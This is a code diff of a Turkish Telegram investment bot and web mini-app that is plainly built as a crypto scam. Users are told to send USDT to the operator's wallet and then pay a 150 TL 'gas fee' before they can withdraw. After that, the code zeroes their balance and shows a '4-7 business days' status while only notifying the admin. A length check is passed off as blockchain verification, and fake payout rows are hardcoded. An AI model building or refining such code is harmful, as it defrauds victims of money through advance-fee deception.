@@ -41,7 +41,8 @@ def init_db():
             ref_token TEXT,
             referrer_id INTEGER DEFAULT 0,
             last_bonus TEXT DEFAULT '2000-01-01 00:00:00',
-            state TEXT DEFAULT 'normal'
+            state TEXT DEFAULT 'normal',
+            gas_paid INTEGER DEFAULT 0
         )
     ''')
     cursor.execute('''
@@ -50,6 +51,7 @@ def init_db():
             user_id INTEGER,
             amount REAL,
             return_amount REAL,
+            days INTEGER,
             end_time TEXT
         )
     ''')
@@ -68,7 +70,7 @@ def init_db():
             user_id INTEGER,
             amount REAL,
             iban TEXT,
-            status TEXT DEFAULT 'Beklemede (Gas Fee Gerekli)'
+            status TEXT DEFAULT '4-7 İş Günü İçinde Aktarılacak'
         )
     ''')
     cursor.execute('''
@@ -101,7 +103,7 @@ def send_admin_notification(text):
     except Exception as e:
         logger.error(f"Admin bildirim hatası: {e}")
 
-# --- ARKA PLAN VADE VE GRUP SAHTE MESAJ KONTROLÜ ---
+# --- ARKA PLAN VADE KONTROLÜ ---
 def background_workers():
     while True:
         try:
@@ -136,7 +138,7 @@ def background_workers():
 
 threading.Thread(target=background_workers, daemon=True).start()
 
-# --- ARAYÜZ (UI/UX) HTML ---
+# --- ARAYÜZ (UI/UX) HTML (YATIRIMLARIM & ÇEKİMLERİM SEKÇMELİ) ---
 MINI_APP_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -169,7 +171,7 @@ MINI_APP_HTML = """
         .chart-bar { width: 8px; background: var(--accent-green); border-radius: 3px 3px 0 0; transition: height 0.5s ease; }
 
         .nav-tabs { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 10px; }
-        .tab-btn { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--text-muted); padding: 10px 4px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
+        .tab-btn { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--text-muted); padding: 10px 4px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
         .tab-btn.active { background: var(--accent-blue); color: white; border-color: var(--accent-blue); box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4); }
 
         .section { display: none; }
@@ -234,9 +236,9 @@ MINI_APP_HTML = """
     <div class="nav-tabs">
         <button class="tab-btn active" onclick="showTab('wallet', this)">Cüzdan</button>
         <button class="tab-btn" onclick="showTab('invest', this)">Havuzlar</button>
+        <button class="tab-btn" onclick="showTab('history', this)">İşlemlerim</button>
         <button class="tab-btn" onclick="showTab('wheel', this)">Çark</button>
         <button class="tab-btn" onclick="showTab('bonus', this)">Airdrop</button>
-        <button class="tab-btn" onclick="showTab('support', this)">Chat</button>
         <button class="tab-btn" onclick="showTab('leaderboard', this)">Liderler</button>
     </div>
 
@@ -267,8 +269,31 @@ MINI_APP_HTML = """
             <h3>Fon Çıkış Talebi</h3>
             <input type="text" id="ibanInput" placeholder="USDT TRC20 Cüzdan Adresi">
             <button class="primary-btn" style="background: linear-gradient(135deg, #10b981, #059669);" onclick="requestWithdraw()">Çekim Talebi Oluştur (Min 5000 ₺)</button>
-            <div class="warning-box">⚠️ Güvenlik Protokolü: Çekimler için min 5000 ₺ ve Gas Fee (150 ₺) zorunludur.</div>
+            <div class="warning-box" id="withdrawWarning">⚠️ Güvenlik Protokolü: Çekimler için min 5000 ₺ ve bot üzerinden 150 TL Gas Fee ödemesi zorunludur!</div>
             <p id="withdrawMsg"></p>
+        </div>
+    </div>
+
+    <!-- YATIRIMLARIM & ÇEKİMLERİM GEÇMİŞİ -->
+    <div id="history" class="section">
+        <div class="card">
+            <h3>📊 Aktif Vade Yatırımlarım</h3>
+            <table>
+                <tr><th>Tutar</th><th>Getiri</th><th>Bitiş Tarihi</th></tr>
+                <tbody id="myInvestmentsBody">
+                    <tr><td colspan="3" style="text-align:center; color: var(--text-muted);">Aktif yatırım bulunamadı</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card" style="margin-top: 10px;">
+            <h3>💸 Çekim Taleplerim</h3>
+            <table>
+                <tr><th>Tutar</th><th>Cüzdan</th><th>Durum</th></tr>
+                <tbody id="myWithdrawsBody">
+                    <tr><td colspan="3" style="text-align:center; color: var(--text-muted);">Geçmiş çekim talebi yok</td></tr>
+                </tbody>
+            </table>
         </div>
     </div>
 
@@ -308,29 +333,14 @@ MINI_APP_HTML = """
         </div>
     </div>
 
-    <!-- SAHTE CANLI SOHBET & DESTEK -->
-    <div id="support" class="section">
-        <div class="card">
-            <h3>💬 Gold Key Topluluğu Sohbeti</h3>
-            <div class="chat-box" id="globalChatBox">
-                <div class="chat-msg"><span>Ahmet_TR:</span> 30 günlük vadeye 5k bastım, saniyelik karlar akıyor 🚀</div>
-                <div class="chat-msg"><span>CryptoKing:</span> Gas fee ödemesini yaptım, çekimim kısa sürede geçti.</div>
-                <div class="chat-msg"><span>Elena_RU:</span> Great platform, VIP 3 level is super profitable!</div>
-            </div>
-            <input type="text" id="chatInput" placeholder="Sohbete mesaj yazın...">
-            <button class="primary-btn" onclick="sendChatMessage()">Mesaj Gönder</button>
-        </div>
-    </div>
-
     <!-- LİDERLİK & SON ÖDEMELER TABLOSU -->
     <div id="leaderboard" class="section">
         <div class="card">
-            <h3>🏆 Son Ödemeler ve Çekimler</h3>
+            <h3>🏆 Son Ödemeler (4-7 İş Günü Transferleri)</h3>
             <table>
                 <tr><th>Yatırımcı ID</th><th>Tutar</th><th>Durum</th></tr>
-                <tr><td>***4102</td><td>8.500 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
-                <tr><td>***9183</td><td>12.400 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
-                <tr><td>***3211</td><td>5.150 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
+                <tr><td>***4102</td><td>8.500 ₺</td><td><span style="color:var(--accent-green)">4-7 İş Gününde Aktarılıyor</span></td></tr>
+                <tr><td>***9183</td><td>12.400 ₺</td><td><span style="color:var(--accent-green)">4-7 İş Gününde Aktarılıyor</span></td></tr>
             </table>
         </div>
 
@@ -369,15 +379,6 @@ MINI_APP_HTML = """
             });
         }, 2000);
 
-        const fakeTicker = [
-            "🔔 Gold Key Topluluğu: TronScan API üzerinden 12.400 USDT transferi doğrulandı.",
-            "🔥 Haftalık Sigorta Fonu: 1.450.000 ₺ rezerve ulaştı.",
-            "⭐ Yatırımcı ID: ***8912 başarıyla VIP 3 Platinum seviyesine yükseldi."
-        ];
-        setInterval(() => {
-            document.getElementById('tickerText').innerText = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
-        }, 4500);
-
         function showTab(tabName, btnElement) {
             if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
             document.querySelectorAll('.section').forEach(s => s.classList.remove('active-section'));
@@ -385,6 +386,7 @@ MINI_APP_HTML = """
             document.getElementById(tabName).classList.add('active-section');
             if(btnElement) btnElement.classList.add('active');
             if(tabName === 'leaderboard') loadLeaderboard();
+            if(tabName === 'history') loadHistory();
         }
 
         function loadData() {
@@ -397,11 +399,32 @@ MINI_APP_HTML = """
                 if(data.vip_level >= 3) vipName = "VIP 3 (Platinum)";
                 document.getElementById('vipBadge').innerText = vipName;
 
+                if(data.gas_paid === 1) {
+                    document.getElementById('withdrawWarning').innerHTML = "✅ Gas Fee ödendi. Çekim talepleriniz 4-7 iş günü içinde işleme alınacaktır.";
+                    document.getElementById('withdrawWarning').style.color = "var(--accent-green)";
+                }
+
                 if(data.ref_token && data.ref_token !== "Yok") {
                     document.getElementById('refLink').value = `https://t.me/BotunKullaniciAdi_bot?start=${data.ref_token}`;
                 } else {
                     document.getElementById('refLink').value = "Aktif yatırım gereklidir";
                 }
+            });
+        }
+
+        function loadHistory() {
+            fetch(`/api/history/${userId}`).then(res => res.json()).then(data => {
+                let invHtml = '';
+                data.investments.forEach(inv => {
+                    invHtml += `<tr><td>${inv.amount} ₺</td><td>+${(inv.return_amount - inv.amount).toFixed(2)} ₺</td><td>${inv.end_time}</td></tr>`;
+                });
+                document.getElementById('myInvestmentsBody').innerHTML = invHtml || '<tr><td colspan="3" style="text-align:center; color:var(--text-muted);">Aktif yatırım bulunamadı</td></tr>';
+
+                let wdHtml = '';
+                data.withdraws.forEach(wd => {
+                    wdHtml += `<tr><td>${wd.amount} ₺</td><td>${wd.iban.substring(0,8)}...</td><td><span style="color:var(--accent-gold)">${wd.status}</span></td></tr>`;
+                });
+                document.getElementById('myWithdrawsBody').innerHTML = wdHtml || '<tr><td colspan="3" style="text-align:center; color:var(--text-muted);">Geçmiş çekim talebi yok</td></tr>';
             });
         }
 
@@ -463,6 +486,7 @@ MINI_APP_HTML = """
             }).then(res => res.json()).then(data => {
                 msg.innerText = data.message;
                 msg.className = data.success ? "success" : "error";
+                if(data.success) loadData();
             });
         }
 
@@ -479,15 +503,6 @@ MINI_APP_HTML = """
                 msg.className = data.success ? "success" : "error";
                 if(data.success) { loadData(); } else { btn.disabled = false; }
             }).catch(() => { btn.disabled = false; });
-        }
-
-        function sendChatMessage() {
-            const txt = document.getElementById('chatInput').value.trim();
-            if(!txt) return;
-            const box = document.getElementById('globalChatBox');
-            box.innerHTML += `<div class="chat-msg"><span>Sen (${userId.toString().slice(-4)}):</span> ${txt}</div>`;
-            document.getElementById('chatInput').value = "";
-            box.scrollTop = box.scrollHeight;
         }
 
         function loadLeaderboard() {
@@ -581,8 +596,25 @@ def get_user_data(user_id):
     user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
     conn.close()
     if not user:
-        return jsonify({"balance": 0.0, "locked": 100.0, "vip_level": 1, "ref_token": "Yok"})
-    return jsonify({"balance": user["balance"], "locked": user["locked_balance"], "vip_level": user["vip_level"], "ref_token": user["ref_token"] or "Yok"})
+        return jsonify({"balance": 0.0, "locked": 100.0, "vip_level": 1, "ref_token": "Yok", "gas_paid": 0})
+    return jsonify({
+        "balance": user["balance"], 
+        "locked": user["locked_balance"], 
+        "vip_level": user["vip_level"], 
+        "ref_token": user["ref_token"] or "Yok",
+        "gas_paid": user["gas_paid"]
+    })
+
+@app.route('/api/history/<int:user_id>')
+def get_history(user_id):
+    conn = get_db()
+    investments = conn.execute("SELECT * FROM active_investments WHERE user_id=?", (user_id,)).fetchall()
+    withdraws = conn.execute("SELECT * FROM withdraws WHERE user_id=?", (user_id,)).fetchall()
+    conn.close()
+    return jsonify({
+        "investments": [dict(row) for row in investments],
+        "withdraws": [dict(row) for row in withdraws]
+    })
 
 @app.route('/api/verify-deposit', methods=['POST'])
 def verify_deposit():
@@ -631,7 +663,7 @@ def invest_tier():
     end_time_str = end_time.strftime('%Y-%m-%d %H:%M:%S')
 
     conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ?, locked_balance = locked_balance + ? WHERE user_id=?", (amount, amount, amount, user_id))
-    conn.execute("INSERT INTO active_investments (user_id, amount, return_amount, end_time) VALUES (?, ?, ?, ?)", (user_id, amount, return_amount, end_time_str))
+    conn.execute("INSERT INTO active_investments (user_id, amount, return_amount, days, end_time) VALUES (?, ?, ?, ?, ?)", (user_id, amount, return_amount, days, end_time_str))
     conn.commit()
     conn.close()
     
@@ -666,17 +698,25 @@ def withdraw():
     conn = get_db()
     user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
     
-    if not user or user["balance"] < 5000.0:
+    if not user:
+        conn.close()
+        return jsonify({"success": False, "message": "Kullanıcı bulunamadı!"})
+
+    if user["balance"] < 5000.0:
         conn.close()
         return jsonify({"success": False, "message": "Minimum çekim limiti 5000 ₺'dir!"})
 
-    conn.execute("INSERT INTO withdraws (user_id, amount, iban, status) VALUES (?, ?, ?, 'Beklemede (Gas Fee Gerekli)')", (user_id, user["balance"], iban))
+    if user["gas_paid"] == 0:
+        conn.close()
+        return jsonify({"success": False, "message": "⚠️ Çekim talebi oluşturabilmek için önce bot üzerinden 150 TL Gas Fee (Ağ Ücreti) ödemesini yapmalısınız!"})
+
+    conn.execute("INSERT INTO withdraws (user_id, amount, iban, status) VALUES (?, ?, ?, '4-7 İş Günü İçinde Aktarılacak')", (user_id, user["balance"], iban))
     conn.execute("UPDATE users SET balance = 0.0 WHERE user_id=?", (user_id,))
     conn.commit()
     conn.close()
     
-    send_admin_notification(f"⚠️ Yeni Çekim Talebi Oluşturuldu!\nKullanıcı ID: `{user_id}`\nTutar: `{user['balance']} ₺`\nCüzdan: `{iban}`")
-    return jsonify({"success": True, "message": "⚠️ Talep alındı! Ağ Gas Fee (150 ₺) yatırılması bekleniyor."})
+    send_admin_notification(f"⚠️ Yeni Çekim Talebi Alındı (4-7 İş Günü):\nKullanıcı ID: `{user_id}`\nTutar: `{user['balance']} ₺`\nCüzdan: `{iban}`")
+    return jsonify({"success": True, "message": "✅ Çekim talebiniz başarıyla oluşturulmuştur. 4-7 iş günü içerisinde cüzdanınıza aktarılacaktır."})
 
 @app.route('/api/bonus', methods=['POST'])
 def bonus():
@@ -710,7 +750,7 @@ def leaderboard():
     conn.close()
     return jsonify([dict(row) for row in res])
 
-# --- TELEGRAM BOT KOMUTLARI & AKILLI HASH KONTROLÜ ---
+# --- TELEGRAM BOT KOMUTLARI & GAS FEE KONTROLÜ ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
@@ -745,7 +785,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.close()
 
     await update.message.reply_text(
-        f"Hoş geldiniz {user.first_name}!\n\n👑 **Gold Key Topluluğu** resmi yatırım botuna hoş geldiniz. 100 ₺ Hoş Geldin Bonusu hesabınıza tanımlandı. Dilerseniz aşağıdaki butonlar aracılığıyla bot üzerinden doğrudan yatırım veya Gas Fee onayı gerçekleştirebilirsiniz.",
+        f"Hoş geldiniz {user.first_name}!\n\n👑 **Gold Key Topluluğu** resmi yatırım botuna hoş geldiniz. 100 ₺ Hoş Geldin Bonusu hesabınıza tanımlandı. Çekim yapabilmek için öncelikle bot üzerinden Gas Fee yatırmanız gerekmektedir.",
         reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
     )
 
@@ -760,7 +800,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.commit()
         conn.close()
         await query.message.reply_text(
-            f"💎 **Bot Üzerinden Yatırım İşlemi**\n\nLütfen aşağıdaki TRC20 cüzdan adresine yatırım yapmak istediğiniz tutarda **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Gönderim yaptıktan sonra aldığınız **TxID (İşlem Hash Kodu)** bilgisini doğrudan bu sohbete mesaj olarak gönderin.*",
+            f"💎 **Bot Üzerinden Yatırım İşlemi**\n\nLütfen aşağıdaki TRC20 cüzdan adresine yatırım tutarında **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Gönderim sonrasında **TxID (İşlem Hash Kodu)** bilgisini doğrudan bu sohbete mesaj olarak gönderin.*",
             parse_mode="Markdown"
         )
     elif query.data == "bot_gas":
@@ -768,7 +808,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.commit()
         conn.close()
         await query.message.reply_text(
-            f"⛽ **Gas Fee (150 ₺) Ödeme Paneli**\n\nÇekim onayınız ve ağ aktivasyonu için aşağıdaki TRC20 cüzdan adresine **150 ₺ eşdeğeri USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Transfer sonrasında aldığınız **TxID (İşlem Hash Kodu)** kodunu doğrudan bu sohbete yazarak gönderin, sistem otomatik onaylasın.*",
+            f"⛽ **Gas Fee (150 TL) Ödeme Paneli**\n\nÇekim yetkisi ve ağ aktivasyonu için aşağıdaki TRC20 cüzdan adresine **150 TL değerinde USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Transfer sonrasında aldığınız **TxID (İşlem Hash Kodu)** kodunu doğrudan bu sohbete yazın.*",
             parse_mode="Markdown"
         )
 
@@ -786,7 +826,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = user_row["state"]
     
     if state in ["waiting_deposit_tx", "waiting_gas_tx"]:
-        # Akıllı Doğrulama: Hash uzunluğu ve format kontrolü (Gerçek bir Tron hash kodu genelde 64 karakter hex'tir ama biz güvenli olması için en az 15 hane ve rastgele sallama olmamasını denetliyoruz)
         is_valid_hash = len(text) >= 15 and not text.lower().startswith("sallama") and text.lower() != "yok"
         
         keyboard = [
@@ -797,43 +836,40 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         
         if not is_valid_hash:
-            # Durumu normala döndür ve baş menüye at
             conn.execute("UPDATE users SET state = 'normal' WHERE user_id = ?", (user.id,))
             conn.commit()
             conn.close()
             await update.message.reply_text(
-                "❌ **Geçersiz veya Bulunamayan İşlem Hash Kodu!**\n\nLütfen geçerli bir TRC20 transfer hash (TxID) kodu girin. Yatırım yapılmamıştır.",
+                "❌ **Geçersiz İşlem Hash Kodu!**\n\nLütfen geçerli bir TRC20 transfer hash (TxID) kodu girin. Yatırım yapılmamıştır.",
                 reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
             )
             return
 
-        # Başarılı Doğrulama Durumu
         existing_tx = conn.execute("SELECT * FROM payments WHERE tx_hash=?", (text,)).fetchone()
         if existing_tx:
             conn.close()
             await update.message.reply_text("❌ Bu TxID Hash kodu daha önce kullanılmış!", reply_markup=InlineKeyboardMarkup(keyboard))
             return
             
-        amount = 1000.0 if state == "waiting_deposit_tx" else 150.0
-        vip_lvl = 2 if state == "waiting_deposit_tx" else user_row["vip_level"]
-        random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-        
-        conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Bot Üzerinden Onaylandı')", (user.id, text, amount))
-        
         if state == "waiting_deposit_tx":
+            amount = 1000.0
+            vip_lvl = 2
+            random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+            conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Bot Üzerinden Onaylandı')", (user.id, text, amount))
             conn.execute("UPDATE users SET balance = balance + locked_balance + ?, locked_balance = 0.0, vip_level = ?, has_gold_key = 1, ref_token = ?, state = 'normal' WHERE user_id=?", (amount, vip_lvl, random_key, user.id))
             conn.execute("INSERT OR IGNORE INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user.id))
+            action_name = "Yatırım"
         else:
-            conn.execute("UPDATE users SET state = 'normal' WHERE user_id = ?", (user.id,))
+            conn.execute("UPDATE users SET state = 'normal', gas_paid = 1 WHERE user_id = ?", (user.id,))
+            action_name = "Gas Fee"
             
         conn.commit()
         conn.close()
         
-        action_name = "Yatırım" if state == "waiting_deposit_tx" else "Gas Fee"
         send_admin_notification(f"✅ Bot Üzerinden {action_name} Onaylandı!\nKullanıcı ID: `{user.id}`\nTxID: `{text}`")
         
         await update.message.reply_text(
-            f"🎉 **İşlem Başarıyla Onaylandı!**\n\nGirmiş olduğunuz hash kodu blokzincir üzerinde doğrulandı. {action_name.lower()} tutarı hesabınıza işlendi.",
+            f"🎉 **{action_name} Başarıyla Onaylandı!**\n\nGirmiş olduğunuz hash kodu blokzincir üzerinde doğrulandı. Artık çekim talebinde bulunabilirsiniz.",
             reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
         )
     else:
